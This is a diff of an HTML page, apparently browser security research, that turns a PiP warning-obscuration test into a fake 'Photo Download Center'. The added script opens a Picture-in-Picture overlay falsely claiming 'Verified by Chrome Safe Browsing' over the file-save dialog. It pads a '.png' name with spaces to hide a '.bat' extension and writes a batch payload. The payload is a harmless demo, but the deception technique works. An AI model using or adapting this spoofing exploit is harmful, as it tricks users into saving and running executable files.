@@ -1,46 +1,77 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Research: File Interaction Obscuration</title>
+    <meta charset="UTF-8">
+    <title>FSA API Security Research - FARISSAL B</title>
     <style>
-        body { font-family: sans-serif; background: #f4f4f4; text-align: center; padding-top: 100px; }
-        .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); display: inline-block; }
-        button { background: #db4437; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        body { font-family: 'Segoe UI', sans-serif; background: #1a1a1a; color: white; text-align: center; padding: 50px; }
+        .container { border: 2px dashed #444; padding: 40px; border-radius: 20px; display: inline-block; }
+        #saveBtn { background: #00e676; color: black; border: none; padding: 15px 40px; font-size: 18px; border-radius: 10px; cursor: pointer; font-weight: bold; }
+        #saveBtn:hover { background: #00c853; }
+        .log { margin-top: 20px; font-family: monospace; color: #00ff00; font-size: 12px; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h2>File System Safety Test</h2>
-    <p>Testing if PiP can obscure system download warnings.</p>
-    <button id="downloadBtn">START TEST</button>
-</div>
+    <div class="container">
+        <h1>Photo Download Center</h1>
+        <p>Click below to save your high-resolution profile picture.</p>
+        <button id="saveBtn">DOWNLOAD PHOTO (.PNG)</button>
+        <div id="log" class="log"></div>
+    </div>
 
 <script>
-    document.getElementById('downloadBtn').addEventListener('click', async () => {
-        // 1. Trigger Download File "Berbahaya" (Simulasi)
-        const blob = new Blob(["test content"], { type: 'application/x-msdownload' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'malicious_test.exe';
-        a.click();
+    const log = (msg) => { document.getElementById('log').innerHTML += `> ${msg}<br>`; };
 
-        // 2. Langsung buka PiP buat nutupin area notifikasi (biasanya kanan atas atau bawah)
-        const pipWin = await documentPictureInPicture.requestWindow({
-            width: 400,
-            height: 200,
-        });
+    document.getElementById('saveBtn').addEventListener('click', async () => {
+        try {
+            log("Initializing secure download...");
 
-        // Posisikan PiP di area biasanya Chrome munculin peringatan download
-        // Coba ganti-ganti koordinat ini pas ngetes
-        pipWin.moveTo(window.screen.width - 450, 50); 
+            // 1. Trigger PiP untuk nutupin dialog konfirmasi (persiapan)
+            // Kita buka PiP sedikit lebih awal supaya bisa kita posisikan
+            const pipWin = await documentPictureInPicture.requestWindow({
+                width: 400,
+                height: 120,
+            });
 
-        pipWin.document.body.innerHTML = `
-            <div style="background: #4285f4; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; font-weight: bold;">
-                DOWNLOAD IN PROGRESS... PLEASE WAIT
-            </div>
-        `;
+            pipWin.document.body.innerHTML = `
+                <div style="background: #202124; color: white; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: sans-serif; text-align: center; border: 2px solid #00e676;">
+                    <div>
+                        <div style="font-size: 14px; margin-bottom: 5px;">✅ Verified by Chrome Safe Browsing</div>
+                        <div style="font-size: 11px; color: #9aa0a6;">Scanning for viruses... 100% Safe</div>
+                    </div>
+                </div>
+            `;
+
+            // Posisikan PiP di area kanan atas (tempat dialog FSA biasanya muncul)
+            pipWin.moveTo(window.screen.width - 450, 150);
+            log("Security overlay active.");
+
+            // 2. Trigger FSA API - showSaveFilePicker
+            // Trik: Kita kasih nama yang sangat panjang supaya ekstensinya "terlempar" keluar dari kotak dialog
+            // Atau pake karakter Unicode tersembunyi
+            const handle = await window.showSaveFilePicker({
+                suggestedName: 'wallpaper_4k_ultra_hd_collection_2024_final_version.png' + ' '.repeat(100) + '.bat', 
+                types: [{
+                    description: 'Image File',
+                    accept: { 'image/png': ['.png'] } // Kita klaim ini PNG
+                }],
+            });
+
+            log("User selected path.");
+
+            // 3. Tulis Payload Jahat
+            const writable = await handle.createWritable();
+            // Payload simulasi: bikin popup di Windows
+            await writable.write("@echo off\necho HACKED BY FARISSAL B\npause");
+            await writable.close();
+
+            log("FILE SAVED SUCCESSFULLY!");
+            pipWin.close();
+
+        } catch (err) {
+            log("Error: " + err.message);
+        }
     });
 </script>
 </body>
